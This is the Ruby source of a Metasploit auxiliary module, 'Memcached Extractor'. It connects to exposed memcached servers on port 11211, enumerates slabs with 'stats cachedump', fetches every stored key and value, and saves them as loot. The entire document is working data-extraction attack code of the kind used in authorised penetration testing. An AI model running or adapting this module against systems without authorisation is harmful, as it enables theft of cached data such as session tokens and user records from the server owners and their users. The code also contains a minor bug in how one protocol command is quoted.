##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Memcached Extractor',
      'Description'   => %q(
        This module extracts the slabs from a memcached instance.  It then
        finds the keys and values stored in those slabs.
      ),
      'Author'        => [ 'Paul Deardorff <paul_deardorff[at]rapid7.com>' ],
      'License'       => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(11211),
        OptInt.new('MAXKEYS', [ true, 'Maximum number of keys to be pulled from a slab', 100] )
      ], self.class)
  end

  def max_keys
    datastore['MAXKEYS'].to_i
  end

  class Stream
    def initialize(sock, cmd)
      @sock = sock
      @sock.send(cmd, 0)
    end
    def each
      loop do
        data = @sock.recv(4096)
        break if !data || data.length == 0
        yield data
        break if data =~ /^END/
      end
    end
  end

  # Returns array of keys for all slabs
  def enumerate_keys
    keys = []
    enumerate_slab_ids.each do |sid|
      sock.send("stats cachedump #{sid} #{max_keys}\r\n", 0)
      data = sock.recv(4096)
      matches = /^ITEM (?<key>.*) \[/.match(data)
      keys << matches[:key] if matches
    end
    keys
  end

  # Returns array of slab ids as strings
  def enumerate_slab_ids
    slab_ids = []
    Stream.new(sock, 'stats slabs\r\n').each do |data|
      matches = data.scan(/^STAT (?<slab_id>(\d)*):/)
      slab_ids << matches
    end
    slab_ids.flatten!
    slab_ids.uniq! || []
  end

  def data_for_keys(keys = [])
    all_data = {}
    keys.each do |key|
      sock.send("get #{key}\r\n", 0)
      data = []
      loop do
        data_part = sock.recv(4096)
        break if !data_part || data_part.length == 0
        data << data_part
        break if data_part =~ /^END/
      end
      all_data[key] = data
    end
    all_data
  end

  def determine_version
    sock.send("stats\r\n", 0)
    stats = sock.recv(4096)
    matches = /^STAT (?<version>version (\.|\d)*)/.match(stats)
    matches[:version] || 'unkown version'
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} - Connecting to memcached server...")
    begin
      connect
      print_good("Connected to memcached #{determine_version}")
      keys = enumerate_keys
      print_good("Found #{keys.size} keys")
      data = data_for_keys(keys)
      if %w(localhost 127.0.0.1).include?(ip)
        result_table = Rex::Ui::Text::Table.new(
          'Header'  => "Keys/Values found for #{ip}:#{rport}",
          'Indent'  => 1,
          'Columns' => [ 'Key', 'Value' ]
        )
        data.take(10).each { |r| result_table << r }
        print_line
        print_line("#{result_table}")
      else
        store_loot('memcached.dump', 'text/plain', ip, data, 'memcached.txt', 'Memcached extractor')
        print_good("Loot stored!")
      end
    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout
      print_error("Could not connect to memcached server!")
    end
  end
end
